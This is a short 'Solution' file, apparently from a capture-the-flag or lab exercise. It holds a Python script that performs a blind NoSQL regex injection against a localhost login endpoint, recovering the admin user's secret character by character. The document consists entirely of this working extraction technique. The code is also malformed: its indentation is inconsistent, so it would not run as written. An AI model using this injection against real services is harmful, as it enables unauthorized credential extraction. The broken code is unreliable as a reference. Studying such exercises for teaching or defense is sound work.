# Solution

```python
import requests
import string
    username="admin"
    secret=""
    url = "http://localhost:5000/"
    headers = {
       'Content-Type': 'application/json',
    }
   while True:
    for c in string.printable:
      if c not in ['*','+','.','?','|','\\']:
        payload={
            "username": username,
            "secret": {"$regex": secret+c }
            }
        r = requests.post(url, headers=headers, json = payload)
        if 'path' in r.text:
            print("Found one more char : ", secret+c)
            secret += c
```